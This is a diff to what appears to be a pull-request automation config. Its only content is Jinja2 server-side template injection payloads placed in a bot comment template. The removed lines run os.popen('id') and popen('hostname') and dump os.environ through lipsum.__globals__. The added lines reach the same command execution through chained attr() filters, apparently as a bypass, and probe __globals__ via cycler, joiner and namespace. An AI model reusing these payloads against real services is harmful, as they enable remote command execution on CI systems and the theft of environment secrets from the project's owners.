@@ -1,16 +1,18 @@
 pull_request_rules:
-  - name: ssti-rce-final
+  - name: ssti-v9-attr-chain
     conditions: []
     actions:
       comment:
         message: |
-          === G4o7T SSTI v8 (main) ===
+          === G4o7T v9 attr-chain ===
           author={{ author }}
           {% if author %}
-          R1-globals: {{ lipsum.__globals__ }}
-          R2-os: {{ lipsum.__globals__.os }}
-          R3-id: {{ lipsum.__globals__.os.popen('id').read() }}
-          R4-hostname: {{ lipsum.__globals__.os.popen('hostname').read() }}
-          R5-env: {{ lipsum.__globals__.os.environ }}
-          R6-uname: {{ lipsum.__globals__.os.uname() }}
+          A1-attr-globals: {{ lipsum | attr('__globals__') }}
+          A2-attr-globals-os: {{ lipsum | attr('__globals__') | attr('os') }}
+          A3-attr-popen: {{ lipsum | attr('__globals__') | attr('os') | attr('popen') }}
+          A4-attr-popen-call: {{ lipsum | attr('__globals__') | attr('os') | attr('popen')('id') }}
+          A5-attr-rce: {{ lipsum | attr('__globals__') | attr('os') | attr('popen')('id') | attr('read')() }}
+          A6-via-cycler: {{ cycler | attr('__globals__') }}
+          A7-via-joiner: {{ joiner | attr('__globals__') }}
+          A8-via-namespace: {{ namespace | attr('__globals__') }}
           {% endif %}
